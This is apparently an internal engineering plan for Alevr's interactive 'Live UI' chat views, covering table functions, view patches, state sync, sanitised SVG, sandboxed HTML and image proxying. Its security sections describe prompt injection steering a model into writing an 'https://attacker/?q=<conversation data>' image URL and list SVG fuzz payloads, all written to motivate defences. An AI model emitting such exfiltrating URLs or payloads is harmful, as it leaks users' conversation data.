   - Compare: horizontally paged cards, with `.glassEffect()` on the recommended card only; pick sends `prompt`.
   - Cards: `LazyVGrid(columns: adaptive(minimum: 220))`; tap sends `prompt`.
   - Tabs: `Picker(.segmented)` up to 4 tabs, a menu above 4.
   - Flashcards: `rotation3DEffect` flip, replaced by a crossfade under Reduce Motion; known/unknown tracking.
   - State goes through the LU-03 keys if LU-03 has landed, otherwise local `@State`.
3. **Unsupported row.** One line with an icon, the type's title if any, and "Update Alevr to see this view". VoiceOver reads the same.
4. **Server.**
   - Add `"live_ui_do"` to `CLIENT_FEATURES` (`client-features.ts:15-25`). The web list includes it automatically (`WEB_CLIENT_FEATURES`).
   - Gate it in `prompt.ts:129` and `private-turn.ts:162`: `liveUiDo: web || clientFeatures.includes("live_ui_do")`.
   - Add it to `NativeChatClientFeatures.declared` **in the same native PR** as the renderers.
5. **iOS send.** `JunoLiveUIHost(onPrompt: { sendLiveUIAnswer($0) }, onSend: { sendLiveUIAnswer($0) })`. Update `LIVE_UI.md` §11.
6. **Samples.** Move `INTELLIGENT_SAMPLES` into `contracts/live-ui/samples.json`. `LiveUISnapshotTests.swift` then renders them.

### Acceptance tests
- `LiveUIFixtureTests.swift` passes for the six types against the same `spec.json` as `tests/live-ui.test.ts`.
- `LiveUISnapshotTests.swift` covers every sample in light and dark, at iPhone 16 width and at Mac default width.
- XCUITest (iOS): opening a conversation whose reply has a web-made `recipe` and moving servings from 2 to 4 shows 400 g where it showed 200 g. Tapping a choice sends a message, with no composer step.
- `{"type":"hologram","title":"X"}` (after the server allows it in a fixture that bypasses lint) shows the unsupported row on iOS and Mac. On the web it is dropped.
- `tests/live-ui-prompt.test.ts`:
  - a native request without `live_ui_do` gets no `LIVE_UI_DO_SECTION`;
  - with it, it gets the section;
  - both variants are byte-stable.

### Risk
Builds already shipped will keep dropping these types in cross-device history until people update. The server cannot fix that and must not try to (INV-26).

---

## LU-06 Tap into any part of a view, and "Ask about this view"

**Size** S–M · **Impact** M–H

### Outcome
- Tapping a bar, a table row, an explorer part, a timeline stage or a stop sends a filled-in follow-up ("Break down Q3 by region", "Tell me more about the derailleur").
- "Ask about this view" in the menu (LU-04) puts the view, with its current values, into the composer as a quote chip, so the person types their own question.

### Competitor evidence
Claude: "In chat, clicking inside a visual sends a follow-up prompt to Claude" (fetched).

### Current code (verified)
- **Only some components send.** `button`, `choices`, `compare`, `cards` and `exercise` send (`live-ui-block.tsx:224-249`). The host carries `messageId` and `onPrompt` only (`src/components/chat/live-ui/host.tsx:15-18`).
- **The quote chip exists.** `AnswerQuote` + `setComposerQuote` (`chat-view.tsx:2103-2114`), `serializeQuote` (`src/lib/quote-context.ts`).
- **Share page.** Prompt buttons are disabled there, with the tooltip "Available in a conversation" (`live-ui-block.tsx:426-432`).

### Build
1. **Spec** (TS + Swift + fixtures). An optional `ask` template string (at most 300 characters) on:
   - `chart`, with locals `x`, `label`, `value` and `series`;
   - `table`, with locals the row's fields plus `row` and `index`;
   - `explorer.parts[]`, with locals `label` and `id`;
   - `timeline.items[]` and `stops.stops[]`, with locals `label`, `time` and `name`.

   It is interpolated with `interpolate(template, scope, locals)` (`expr.ts:740`), like buttons. There is no default auto-send: a component without `ask` only offers "Ask about this" in its context menu.
2. **Web.**
   - Chart points and bars become focusable. Enter or click sends the prompt.
   - On a coarse pointer, a tap that does not move shows a small confirm pill with the exact text ("Send: Break down Q3…"), so scrubbing never sends.
   - Table rows with `ask` get a trailing arrow button rather than a whole-row click target, which keeps text selectable.
3. **Host.**
   - `LiveUIHost.onQuote?(quote: AnswerQuote)`.
   - `chat-view.tsx` wires it to `setComposerQuote` plus the `juno:composer-focus` event.
   - Quote text = spec title + `liveUISummaryWithState` (LU-04), capped at 2,000 characters.
4. **Share page.** A disabled prompt control reads "Continue in Alevr" and links to sign-up or open; it does not send.
5. **Native.** `chartXSelection` already exists (`JunoLiveUIParts.swift:219-221`); a selection followed by a tap on the readout sends. `.contextMenu` on parts and rows offers "Ask about this".
6. **Prompt.** One line added to `LIVE_UI_SECTION`'s Outputs list: "chart, table rows, explorer parts, timeline items and stops take ask: a follow-up sent when tapped ({{label}}, {{value}}, row fields)".

### Security
- Templates are model-written and pass only through `interpolate`, as buttons do.
- A sent prompt is ordinary user text that the user tapped. Nothing is sent without a gesture.

### Acceptance tests
- Clicking bar Q3 sends a prompt containing "Q3" and its formatted value.
- A touch scrub across 10 points sends nothing; the pill appears only on a stationary tap.
- Keyboard: Tab to a point, Enter sends.
- The quote chip contains the title and `Tip: 15%`.
- On the share page the control reads "Continue in Alevr".
- Fixture tests cover `ask` parsing on TS and Swift.

---

## LU-07 Tables people can work with, and filtering inside a view

**Size** M · **Impact** M–H

### Outcome
- Tables:
  - sort by any column (click, or Enter on the header);
  - get a filter box above 8 rows;
  - can show a totals row;
  - mark good and bad cells;
  - page past 100 rows instead of cutting off.
- A select can filter a table or chart in place ("Region: EMEA").

### Competitor evidence
- Claude visuals are HTML, so filtering is whatever the code does (fetched).
- ChatGPT data analysis has had sortable and filterable interactive tables since May 2024. This is prior knowledge (OpenAI, "Improvements to data analysis in ChatGPT", 16 May 2024), not re-fetched today.

### Current code (verified)
- **Table.** `LiveTable` (`live-ui-block.tsx:334-409`): `rows.slice(0, 100)` (`:347`), no sort, filter or totals.
- **Functions.** Expression functions are `if sum avg min max count len round floor ceil abs sqrt exp ln log10 pow clamp range pmt fv normpdf normcdf days addDays fmt` (`expr.ts:697-700`). There is nothing for filtering, sorting or grouping.
- **Inline data.** It is capped at 200 rows (`SPEC_LIMITS.dataRows`, `spec.ts:23`).

### Correction to the audit
The audit's `where(list, 'expr')` takes a nested expression string. That brings quoting problems (`'region == \'EMEA\''`) and a second evaluator inside the first. Use field-and-value forms instead, which are simple to twin in Swift.

### Build
1. **Expression functions** (TS `expr.ts`, Swift `JunoLiveUIExpression.swift`, `fixtures/expr.json`):

   | Function | Behaviour |
   |---|---|
   | `where(list, field, value)` | Keeps the rows whose `field` equals `value`. Also `where(list, field, op, value)` with `op` one of `'<' '<=' '>' '>=' '!='`. |
   | `sortBy(list, field, desc?)` | Stable sort |
   | `groupSum(list, keyField, valueField)` | Returns `[{key, value}]` in first-seen order |
   | `lookup(list, keyField, key, field)` | Returns the field of the first matching row |
   | `unique(list)` | For plucked columns |
   | `take(list, n)` | First n items |

   Each one ticks the existing step budget (`EXPR_LIMITS.steps`, `expr.ts:32`) per element.
2. **Table spec** (TS + Swift + fixtures):
   - `sortable` (default true when there are more than 3 rows);
   - `filter` (default true when there are more than 8 rows);
   - `total: number[]` (column indices to sum);
   - per-column `tone` (an expression returning `'good' | 'bad' | null`, with the row as locals);
   - `pageSize` (default 25).

   The hard cap on rendered rows stays bounded by the 200-row data cap.
3. **Web.**
   - Sort state lives in `useLiveState` (key `o: { [key]: [col, dir] }`).
   - The filter box is a plain substring match over the formatted cells.
   - Sticky header, `aria-sort` on headers, numeric columns right-aligned (already the case).
4. **Native.** Mac uses SwiftUI `Table` with `sortOrder`. iOS uses a `List` with a sort menu. Filter is `.searchable` inside the card.
5. **Prompt.** Replace the third example in `LIVE_UI_SECTION` with a compact table that a select filters. Keep the total section length within +5%, and re-run the cache test.

### Acceptance tests
- `fixtures/expr.json` covers `where`/`sortBy`/`groupSum`/`lookup`/`unique`/`take`, including ties (stable order), nulls and the budget being exceeded. TS and Swift return identical results.
- Sorting is stable, toggles asc → desc → none, works from the keyboard, and `aria-sort` is announced.
- 150 rows with `pageSize` 25 give 6 pages and a correct total row.
- A select with "All, EMEA, APAC" driving `rows: "region == 'All' ? sales : where(sales, 'region', region)"` filters on both platforms (snapshot).

---

## LU-08 Update a view in place (identity, patches, cheaper history)

**Size** M · **Impact** M–H (also a cost item)

### Outcome
- "Make it monthly" updates the same view. The new reply shows the view with an "Updated · v2" marker. The earlier copy collapses to a one-line link, "Updated in a later reply". The reader's slider values carry over.
- A tweak costs tens of output tokens instead of thousands.
- Long chats with many tweaked views stop paying to re-read every superseded copy.

### Competitor evidence
Claude "can update or rebuild a visual as the conversation continues" (fetched).

### Current code (verified)
- **No identity.** The spec root has no `id` (`spec.ts:221-229`).
- **Restore rules.** State restores only onto the same id and type (`use-live-state.ts:57-83`), but the key includes the source hash, so a new block starts from defaults.
- **Full replay.** History replays fences verbatim (`history.ts:77-78`).
- **Cache-aware history.** The window is anchored in `HISTORY_STEP` (8) blocks, so the prefix stays byte-identical (`src/lib/chat/context-assembly.ts:30-44`). The conversation cache breakpoint moves to the newest user message each turn (`src/lib/anthropic-cache.ts:49-70`).
- **Output price.** A re-emitted view is 2–6k characters (`contracts/live-ui/samples.json`); output tokens cost several times input.

### Correction to the audit
The audit replaces **every** non-latest fence in history with a digest. That changes the bytes of an old message the turn after it is superseded, which breaks the provider prompt cache from that message onward. On Anthropic that means a re-write at the 2× 1-hour price. Bound the rewrite instead, as below.

### Build
1. **Identity.** Optional root `"id"` (an identifier) in TS, Swift and fixtures.
2. **Supersede.** Within a conversation's shown branch, a later view with the same `id` supersedes earlier ones.
   - Web: `message-item.tsx` resolves a per-conversation `Map<viewId, latestMessageId>` from the loaded messages. Earlier copies render a one-line link that scrolls to the latest.
   - Native does the same in `MessageRow.swift` and `JunoMobileConversationsView.swift`.
   - The latest copy shows "v2 · Updated" with a version pager that renders earlier sources read-only.
3. **State carry-over.**
   - When a view with `id` first loads with no stored state, it reads the previous version's stored state. Web: the localStorage key of the superseded block. Server: the LU-09 row.
   - It restores through `restoreLiveState`, so only inputs still present with the same type come back.
4. **Patch form.** The fence body `{"id":"savings","patch":[{"op":"replace","path":"/ui/2/x/step","value":0.0833}]}`.
   - A subset of RFC 6902: `add`, `replace`, `remove`, at most 40 ops.
   - Resolved **server-side** in `prepareLiveUIOutput` (LU-01):
     - find the latest full version with the same `id` in this conversation's active branch (`ON_ACTIVE_PATH`, `src/lib/chat/branches.ts`);
     - apply the ops;
     - lint the result;
     - rewrite the fence to the full view before saving.
   - If any op fails or lint is fatal, give the LU-01 repair the base view, the patch and the prose. If that fails too, use the summary fallback.
   - The client renders a patch-form fence while streaming as a one-line "Updating "Savings over time"…" skeleton, detected by a root `patch` key in `parseLiveUI`.
   - The prompt gets 2 lines and one tiny example, appended to `LIVE_UI_SECTION` (re-run the cache test). The patch form is only legal when the previous version is in the visible history.
5. **Bounded history digest** (cost), in `resolveHistory` (`history.ts:77`), via a pure `digestSupersededViews(messages)` in `src/lib/live-ui/history-digest.ts`.
   - A fence is replaced with a ≤240-character digest **only** when a later message within the next 4 messages carries the same `id`.
   - Example digest: `[Live UI view "Savings over time" (id savings), superseded two messages later: inputs monthly, rate, years; area chart of balance.]`.
   - Old messages therefore change only within the last 4 messages, inside the turn's uncached tail. Rapid tweak loops (v1 → v5 in successive turns) collapse to digests.
   - Views without `id`, and views quoted by the newest user message, stay whole.
   - The digest is a pure function of the source, so a digested message's bytes are stable afterwards.

### Acceptance tests
- A stub model emits a patch: the saved message holds the full resolved view (decrypt the row in the test); the earlier copy collapses; the slider value carries over.
- A bad patch path falls back to repair; when that also fails, it falls back to the summary.
- `tests/live-ui-history-digest.test.ts`:
  - a 20-turn fixture with 6 versions of one view cuts view characters by at least 70% on the latest turn;
  - for every pair of consecutive turns, the serialised history prefix up to the 4th-from-last message is byte-identical (the cache-stability property);
  - a quoted superseded view stays whole.
- Output-token check in the LU-01 eval: tweak prompts ("make it monthly") use at most 15% of the output tokens of a full re-emit on the default models.

---

## LU-09 Same view state on every device

**Size** M · **Impact** M

### Outcome
Set a slider or answer two quiz questions on the laptop, open the chat on the iPhone, and the view is in the same state within a few seconds.

### Competitor evidence
- ChatGPT's state is not kept across threads; cross-device behaviour is undocumented (help-centre excerpt).
- Claude's visuals are ephemeral (fetched).
- Neither documents cross-device view state.

### Current code (verified)
- State lives in localStorage and UserDefaults only (see LU-03).
- Sync framework: `GET /api/v1/entities` loaders in `src/lib/sync-entities.ts:59-690`, fed by DB change-capture triggers (`prisma/migrations/20260716200000_account_change_log`).

### Build
1. **Prisma model:**
   ```prisma
   model LiveViewState {
     id        String   @id @default(cuid())
     userId    String
     messageId String
     blockHash String   // liveHash(source.trim()), 8 hex chars (spec.ts:1083)
     state     String   @db.Text // encryptMessageText(JSON.stringify(StoredLiveState)), ≤ 8 KB plaintext
     createdAt DateTime @default(now())
     updatedAt DateTime @updatedAt
     user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
     message   Message  @relation(fields: [messageId], references: [id], onDelete: Cascade)
     @@unique([userId, messageId, blockHash])
     @@index([userId, updatedAt])
   }
   ```
   - Migration plus a change-log trigger with entity type `live_view_state`, following the existing trigger migrations.
   - Loader in `sync-entities.ts`, owner-scoped (`where: { id: { in: ids }, userId: accountId }`), decrypting `state`.
2. **API.** `GET` and `PUT /api/messages/[id]/live-state`.
   - GET returns `{ states: [{ blockHash, state, updatedAt }] }`.
   - PUT takes `{ blockHash, state, baseUpdatedAt? }` and is last-write-wins.
   - Ownership: `message.conversation.userId === user.id && role === "ASSISTANT"`; otherwise 404.
   - zod validates the LU-03 shape and keys. More than 8 KB returns 413.
   - Rate limited with `rateLimit` (`src/lib/rate-limit.ts:17`) at 60 writes per minute per user.
   - Private turns and incognito never write: no message row exists.
3. **Clients.**
   - **Web:** `useLiveState` fetches the message's states on the first mount of a completed view (one GET per message, cached in memory for the session), merges newer-wins with localStorage, and PUTs with a 1 s debounce. localStorage stays the offline and first-paint cache.
   - **Native:** receives `live_view_state` through the change feed, writes through to UserDefaults (still LRU-capped from LU-03), and PUTs on change.
4. **Data handling.**
   - Add the rows to `src/app/api/account/export/route.ts`.
   - Cascades handle deletion of messages, conversations and the account.
   - Exclude the rows from any training or eval export.

### Acceptance tests
- Integration test: PUT by account A, then GET by account B returns 404. PUT of a 9 KB body returns 413. An invalid key shape returns 400.
- Playwright plus the native sync harness: set a slider on the web, and the Mac app shows the same value within 5 s.
- Deleting the conversation removes its rows (DB assertion).
- The export JSON includes the decrypted state.

---

## LU-10 Visual-answers setting, chart accent and per-model gating

**Size** S · **Impact** M

### Outcome
- **Settings > Personalization > Visual answers: Rich / Balanced / Text only.**
- "Make all my charts green" sticks.
- Models that the LU-01 eval shows to be weak at views get a smaller, safer contract, so they stop producing broken ones.

### Competitor evidence
- ChatGPT: "Personalization > Layout and Visuals > Simple" reduces visual elements (help-centre excerpt).
- Claude: "make all my visualizations pink … Claude will remember" (fetched).

### Current code (verified)
- **No setting.** The `Settings` model has `personality` and `customInstructions` but nothing visual (`prisma/schema.prisma`, Settings, around `:536-545`). The Live UI prompt is gated only by client (`prompt.ts:127-129`).
- **Memory notes already reach the model.** They arrive in the volatile tail (`turn-context-tail.ts:53-75`), so "the user wants green charts" saved as a memory fact already reaches every later turn. What is missing is a way to express a colour.

### Corrections to the audit
- A `visual_style` memory tag and a tail line are unnecessary; the memory pipeline already carries the preference.
- The tone-sliders work in flight owns the Personalization panel. Add this control **to that panel**, not a second one.

### Build
1. `Settings.visualAnswers String @default("rich")`, one of `rich | balanced | text`.
   - Serialised by the `settings` sync loader (`sync-entities.ts:68`) and editable in the Personalization panel. The native settings screens read it from sync.
2. Prompt variants, each a constant:
   - Rich = today's sections.
   - Balanced = `LIVE_UI_SECTION_BALANCED`: triggers narrowed to numbers people change, comparisons and plans; one example; no `LIVE_UI_DO_SECTION`.
   - Text = no Live UI sections. This saves about 2.4k cached tokens per turn.

   The selection is made in `prompt.ts` and `private-turn.ts`.
3. Spec root `accent` from a fixed palette `blue | green | orange | pink | purple | teal`, mapped to tokens in `live-ui.css` and `Color.junoLiveAccent(_:)`. Any other value is ignored. The prompt gains one clause: "accent?: one of …, when the user asked for a colour".
4. Per-model gating: a constant map `LIVE_UI_TIER: Record<modelId, "rich" | "balanced">` generated from the LU-01 eval output (lint-clean rate under 90% → balanced). The effective tier = min(user setting, model tier).
5. A thumbs-down reason "Not helpful as a view" in `src/lib/feedback-reasons.ts`. Feedback flows into the routing signal already (`feedback/route.ts:48-52`).

### Acceptance tests
- `tests/live-ui-prompt.test.ts`: each of the 3 variants is byte-stable across two users; Text contains no `live-ui`; Balanced contains no `LIVE_UI_DO_SECTION`.
- Eval subset: Text produces 0 fences over 50 prompts. Balanced produces no views on the teaching-negative prompts.
- The setting round-trips through the sync loader.
- `accent: "green"` renders the green token on web and native snapshots, and `accent: "#ff0000"` is ignored.

---

## LU-11 Drawn diagrams in the explorer

**Size** M–L · **Impact** M–H

### Outcome
"How does a bike work?" shows a drawn bicycle whose parts you tap: the frame, chain, derailleur and brakes light up and explain themselves. Today it is dots joined by lines.

### Competitor evidence
- ChatGPT's launch coverage shows a 7-speed bicycle broken into tappable parts (press, Oct 2026; search excerpt).
- Claude's HTML visuals can draw anything (fetched).

### Current code (verified)
- The explorer places parts at `at:[x,y]` on a 0–100 field, joined by `<line>`s (`live-ui-parts.tsx:21-120`, `spec.ts:649-699`).
- Native mirrors it (`JunoLiveUIParts.swift`).

### Build
1. `explorer.figure`: at most 12,000 characters of an **SVG subset**, with `viewBox` required.
   - **Allowed elements:** `svg g path rect circle ellipse line polyline polygon text`.
   - **Allowed attributes:** geometry (`d x y x1 y1 x2 y2 cx cy r rx ry width height points`), `transform` (translate, scale, rotate, matrix only), `data-part`, `font-size`, `text-anchor`, `stroke-width`, `fill` and `stroke` restricted to the tokens `ink | muted | accent | surface | none`.
   - **Never allowed:** `style`, `class`, any `on*`, `href` / `xlink:href`, `use`, `image`, `foreignObject`, `script`, `url(`, entities, or comments.
2. Sanitiser `src/lib/live-ui/svg.ts`. It parses into a small AST, then re-serialises from the AST, never passing the input string through. It runs:
   - on the server in `lintLiveUI`, where a failure drops `figure` and warns;
   - on the client before rendering.

   Elements carrying a `data-part` matching a part `id` become hotspots, and fills switch to the accent when selected.
3. Web: inline SVG built from the AST as React elements (no `dangerouslySetInnerHTML`). The parts list stays as the keyboard and screen-reader path.
4. Native: `JunoLiveUIFigure.swift` parses the same subset. It supports the full path grammar (M L H V C S Q T A Z, absolute and relative) into SwiftUI `Path`, and the basic shapes. The AST is held to `contracts/live-ui/fixtures/svg.json` with a shared tokenised form.
5. Prompt: one line in the explorer description, plus swapping the HR-schema example's `at` field for a 6-path figure. Keep the section length within +5%.

### Security
- An allowlist AST with re-serialisation means no markup passes through.
- Fuzz fixtures cover: `<script>`, `onload`, `xlink:href`, `style="background:url()"`, entity expansion, CDATA, unicode escapes in attribute names, and a 13,000-character input.

### Acceptance tests
- Every fuzz fixture is stripped; the sanitised output re-parses to the same AST (idempotent).
- The bike sample renders on web and iOS snapshots; tapping the derailleur selects that part; a figure that fails lint falls back to the dot layout.
- Swift path parsing matches TS on `svg.json` (command count and coordinates within 1e-6).

---

## LU-12 Inline sandboxed visuals for simulations and games (`live-html`)

**Size** M–L · **Impact** M–H · **Depends on** the MCP Apps `ui://` inline frame and bridge (in flight)

### Outcome
"Simulate a pendulum", "let me play with orbital mechanics" or "a quick game of Snake" shows a live, animated, controllable visual right in the answer. You can expand it or save it as an artifact. It also works on Mac and iPhone, which Claude's visuals do not.

### Competitor evidence
- Claude's Custom visuals are HTML built from scratch (fetched).
- ChatGPT lists "games" and "task-specific tools" among Intelligent UI elements (help-centre and press excerpts).

### Current code (verified)
- **Live UI never runs code, by design** (`LIVE_UI.md` §1). Full apps go to the canvas.
- **Sandbox.** A separate sandbox origin and shell (`sandboxShellUrl`, `src/lib/sandbox-policy.ts:303`). `SANDBOX_FLAGS.private` = `allow-scripts allow-forms allow-modals allow-downloads allow-pointer-lock` (`:184-188`). The `private` profile's `connect-src` admits the jsDelivr, unpkg and cdnjs CDNs (`:142-146,246`).
- **Inline auto-height already ships for Mermaid** (`buildInlineMermaidDoc`, `src/components/canvas/sandbox-frame.tsx:537-648`).

### Correction to the audit
The audit renders with the `private` profile. That profile allows forms, modals and downloads and has network access to the CDNs, which is too much for model-written code inside the transcript, where the code may have been steered by a prompt-injected web page.

A bridge `alevr.send(prompt)` that sends **as the user** with no host check would also let such code fire messages, including ones that trigger tools, without a click. Use an `inline` profile and a host-confirmed send instead.

### Build
1. **Fence and component.** Fence `live-html`, at most 30,000 characters. New `LiveHTMLBlock` reuses the MCP Apps inline frame component once it lands; do not build a second frame.
2. **Profile `inline`** in `sandbox-policy.ts`, unless MCP Apps already defines an equivalent:

   | Setting | Value |
   |---|---|
   | sandbox | `allow-scripts` only |
   | `connect-src` | `'none'` |
   | `img-src` | `data: blob:` |
   | `script-src` | the shell hash plus a short vendored list served from the sandbox origin (d3, three, matter-js; pinned), no CDN |
   | `form-action` | `'none'` |
   | `frame-src` | `'none'` |

   Theme tokens are injected as CSS variables. Size is reported through the existing size message.
3. **Bridge** (postMessage, origin-checked, schema-validated):
   - `alevr.send(text ≤ 500)` shows a **host-rendered** confirm chip under the frame with the exact text. Only a click on the host chip sends. At most 1 pending chip per frame.
   - `alevr.state.get/set` (≤ 4 KB JSON) goes through LU-03 key `h`.

   Nothing else is bridged.
4. **Lifecycle.**
   - Off-screen frames are paused (IntersectionObserver, then `postMessage("pause")`; the shell stops rAF).
   - At most 3 live frames at once; others show a "Tap to run" poster.
   - An "Interactive code" eyebrow is shown.
   - The source is shown on demand.
5. **Prompt.** A new constant section `LIVE_HTML_SECTION`, used only when the client declares `live_html` (a new client feature):
   - use it only when the declarative set cannot express the idea;
   - always pair it with prose that carries the answer.
6. **Share page.** The `static` profile (no script), following `src/app/share/[token]/page.tsx:42-48`; it shows a poster and "Open in Alevr".
7. **Native.** `WKWebView` with `WKWebsiteDataStore.nonPersistent()`, a `WKContentRuleList` blocking every network load except the bundled libraries, one `WKScriptMessageHandler` (`send`, `state`), and the same host confirm chip. Declare `live_html` in the native PR.

### Acceptance tests
- The pendulum sample animates; its slider changes the period; `alevr.send` shows the chip; nothing is sent until the chip is clicked.
- Frame isolation (Playwright): `document.cookie` and `localStorage` of the app origin are unreachable; `fetch("https://example.com")` and `new Image().src = "https://…"` are blocked by CSP (assert via the `securitypolicyviolation` event); `<form action>` submission is blocked.
- An off-screen frame drops to 0 rAF callbacks within 1 s. A fourth frame shows the poster.
- The LU-01 eval reports `live-html` frequency and output tokens. The target is under 5% of view turns.

---

## LU-13 Views over real data: uploaded files and code-run output

**Size** L · **Impact** M–H · **Depends on** LU-07 (`where`/`groupSum`)

### Outcome
Upload a 3,000-row spreadsheet and ask "revenue by month, by region". You get an interactive chart with a region filter and a sortable table in seconds. The model never copies rows into its reply, and a code run that produced a CSV gets an interactive chart instead of a static image.

### Competitor evidence
- ChatGPT data analysis has had interactive charts and tables since May 2024 (prior knowledge, not re-fetched).
- Claude builds visuals from data in context (fetched).

### Current code (verified)
- **Inline only.** Live UI `data` is inline JSON, cut to 200 rows (`spec.ts:326-334`).
- **Code-run charts are images.** `DataChartBlock` renders a PNG or SVG (`src/components/chat/data-chart-block.tsx:10-26`).
- **Hosted runs are durable.** They are `ToolRun` rows with output files (`src/lib/exec/store.ts`).
- **Attachments accept CSV and XLSX** (`src/lib/uploads.ts:30,53,90-97`). `exceljs` is a dependency.

### Build
1. **Refs.** A `data` value may be `{"$ref":"file:<attachmentId>[#<sheet>]"}` or `{"$ref":"exec:<toolRunId>/<fileName>"}`. Sources, connectors and research results are a later phase.
2. **Server resolution** in `prepareLiveUIOutput` (LU-01):
   - **Authorisation:** the attachment belongs to this conversation and is not deleted; the ToolRun belongs to `userId` and this conversation.
   - **Parsing:** CSV (RFC 4180) or the XLSX sheet through `exceljs`, at most 5,000 rows × 30 columns. Column types are inferred (number, date, text).
   - **Storage:** a `LiveDataset` row and a ref rewrite. The fence is rewritten to `{"$dataset":"<id>"}` before saving.
   ```prisma
   model LiveDataset {
     id             String   @id @default(cuid())
     userId         String
     conversationId String
     messageId      String
     columns        Json     // [{ name, type }]
     rows           String   @db.Text // encryptMessageText(JSON rows)
     rowCount       Int
     createdAt      DateTime @default(now())
     conversation   Conversation @relation(fields: [conversationId], references: [id], onDelete: Cascade)
     message        Message      @relation(fields: [messageId], references: [id], onDelete: Cascade)
     @@index([conversationId])
   }
   ```
3. **Read route.** `GET /api/live-data/[id]`, owner-scoped (`conversation.userId === user.id`), `Cache-Control: private`. A share link may read a dataset only when its snapshot includes that message; this check lives in the share route, and revocation returns 404.
4. **Clients.**
   - The renderer resolves `{"$dataset"}` lazily: a skeleton until fetched, then the dataset is bound into `LiveScope.data`.
   - Charts downsample above 400 points using largest-triangle-three-buckets (LTTB), implemented in TS and Swift with fixtures.
   - The expression step budget scales with rows; aggregation uses `groupSum` and `where`.
   - Native fetches on demand through `NativeChatAPIClient`.
5. **Prompt.** One line, only when the turn has a CSV or XLSX attachment or a run produced a CSV: "bind data with {"$ref":"file:<id>"} instead of copying rows". This goes in the **volatile tail**, next to the attachment extracts, to keep the system prompt stable.

### Acceptance tests
- The 3,000-row CSV scenario produces a view with at most 1,500 output tokens; the saved fence holds `$dataset` and no rows.
- Another account gets 404 on the dataset. A share snapshot renders it; after revocation it returns 404.
- An `exec:` ref to another user's ToolRun is refused at resolution (the fence falls back to the summary).
- LTTB fixtures match between TS and Swift.

---

## LU-14 Route maps for stops on Mac and iPhone

**Size** S–M · **Impact** M

### Outcome
On the Mac and iPhone, a trip's stops appear on a native map in order, with the route drawn and walking or driving times between them. The existing Apple Maps and Google Maps links stay.

### Competitor evidence
- ChatGPT trip answers show itineraries and destination images (press, Oct 2026; search excerpt).
- Claude's HTML can embed maps, but its visuals do not run on iOS (fetched).

### Current code (verified)
- Stops only build "Open in Maps" links on the web (`live-ui-parts.tsx:198-205`) and native (`JunoLiveUIParts.swift:424-431`).
- There is no geocoder, tile provider or map library anywhere in the repo.
- Native targets macOS and iOS 26 (`native/Packages/JunoNativeKit/Package.swift:30-33`), so the SwiftUI `Map`, `Marker`, `MapPolyline`, `MKLocalSearch` and `MKDirections` APIs are all available.

### Correction to the audit
A web map needs a vendor and secret decision (tiles plus a geocoder), plus a privacy review of sending place names to a third party. The audit's server-side geocoding has no provider in the repo. **Ship native first.** Geocoding happens on the device through MapKit, with no server, no key and no new data flow. The web stays on links until a vendor is chosen; that is a separate decision, not part of this PR.

### Build
1. `JunoLiveUIStopsMap.swift`, used for 2–25 stops:
   - Geocode with `MKLocalSearch` per `query`, run in parallel with at most 4 in flight and the results cached in memory per view.
   - Show numbered `Marker`s.
   - Compute legs with `MKDirections` (walking when a leg is under 2 km, otherwise driving), drawn with `MapPolyline` and the leg time as a caption.
   - If any stop fails to geocode, show the list only, as today.
2. A toggle between the list and the map. The list stays the VoiceOver path.
3. Spec: optional `mode: "walk" | "drive" | "transit"` on `stops`, in TS, Swift and fixtures. The web ignores it except for the Google Maps `travelmode` parameter.

### Acceptance tests
- XCTest with a stubbed geocoder: pins appear in authored order; one failure falls back to the list.
- Snapshot of the map card in light and dark.
- VoiceOver reads the numbered stop list.

---

## LU-15 Real photos on cards, only from sources the turn fetched

**Size** M–L · **Impact** M · **Depends on** LU-01

### Outcome
Hotel, product and place cards show a real photo with its source name, instead of a monogram letter.

### Competitor evidence
ChatGPT trip planning "shows images of the destination" (press, Oct 2026; search excerpt).

### Current code (verified)
- **Monogram cards.** Cards draw a monogram letter (`live-ui-intelligent.tsx:490-492`), and `LiveCard` has no image field (`spec.ts:125-134`).
- **Sources carry no image metadata.** The page extractor reads only robots and language meta (`src/lib/web/extract.ts:153-161`). There is no image proxy route under `src/app/api`.
- **SSRF-safe fetch exists:** `src/lib/search/fetch-safe.ts`, `pinned-fetch.ts`, `url-safety.ts`.

### Security finding
The app CSP allows `img-src 'self' blob: data: https:` (`src/lib/csp.ts:74`). An image URL written by the model would therefore load directly. A prompt-injected page could steer the model into writing `https://attacker/?q=<conversation data>`, which exfiltrates that data through an image request.

So **never render a model-written image URL** in Live UI, and keep it that way after this item.

### Build
1. When the turn's web fetch or search reads a page, capture `og:image` / `twitter:image` (absolute https URL only) onto the source record, extending `src/lib/web/extract.ts`.
2. Card field `image: { source: "<sourceId>" }`. Lint resolves it only against `message.sources` of this turn. Anything else is dropped.
3. `GET /api/live-image/[token]`:
   - `token` is an HMAC over `(messageId, sourceId)`.
   - The route fetches through `fetch-safe` (SSRF guards), only `image/*`, at most 2 MB, then re-encodes to WebP at most 800 px wide.
   - It caches by URL hash for 7 days and serves same-origin, which also keeps LU-04's rasteriser untainted.
   - It requires the caller to be able to read the message (owner, or a valid share token for a snapshot containing it).
4. The card shows attribution text: the source's site name, linked to the source.
5. Native loads through the same proxy with the session.

### Acceptance tests
- A card with `image.source` shows the proxied image with attribution.
- A card with `"image":"https://evil/x.png"` renders the monogram, and the network log shows no request to `evil`.
- The proxy refuses a private-IP target, a non-image content type and a 3 MB body.
- Another account gets 404 on the token.

---

## 2. Audit claims checked

| Audit claim | Verdict | Evidence |
|---|---|---|
| 30 component types; declarative, no code | Confirmed | `spec.ts:136-219` (3 layouts + 7 inputs + 20 others) |
| Native renders 24 types; 6 dropped silently | Confirmed | `JunoLiveUISpec.swift:238-255,726` |
| A web-made recipe shows an empty frame on native | Confirmed | `JunoLiveUIView.swift:113-152` |
| iOS prompt buttons fill the composer | Confirmed, but documented as deliberate | `JunoMobileConversationsView.swift:1146-1152`, `LIVE_UI.md` §11 |
| y-axis always includes 0 | Confirmed; fix applies to lines only | `live-ui-chart.tsx:145-146` |
| Labels cut at 14 characters | Confirmed | `live-ui-chart.tsx:263` |
| Table capped at 100 rows; no sort or filter | Confirmed | `live-ui-block.tsx:347` |
| No filter, sort or group functions | Confirmed | `expr.ts:697-700` |
| Learning and "Do" component state is local and lost on reload | Confirmed | `live-ui-learning.tsx:132-133,291-293,536-538`; `live-ui-intelligent.tsx:104-108,528,580-582` |
| Windowing after 24 messages | Confirmed | `use-transcript-window.ts:21` |
| Model never sees reader state; history replays views verbatim | Confirmed | `history.ts:77-78` |
